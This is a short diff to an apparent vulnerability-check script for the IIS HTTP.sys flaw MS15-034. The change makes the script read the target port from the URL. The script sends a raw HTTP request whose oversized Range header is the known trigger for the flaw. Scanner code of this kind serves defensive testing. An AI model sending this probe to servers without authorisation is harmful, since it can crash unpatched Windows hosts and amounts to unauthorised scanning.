@@ -18,10 +18,14 @@ class iis_ms15034_httpsys_rce_BaseVerify:
         self.url = url
 
     def run(self):
-        #提取host
+        port = 80
         if r"http" in self.url:
             #提取host
             host = urlparse(self.url)[1]
+            try:
+                port = int(host.split(':')[1])
+            except:
+                pass
             flag = host.find(":")
             if flag != -1:
                 host = host[:flag]
@@ -29,7 +33,6 @@ class iis_ms15034_httpsys_rce_BaseVerify:
             host = self.url
 
         try:
-            port = 80
             request = "GET / HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n"%host
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(6)
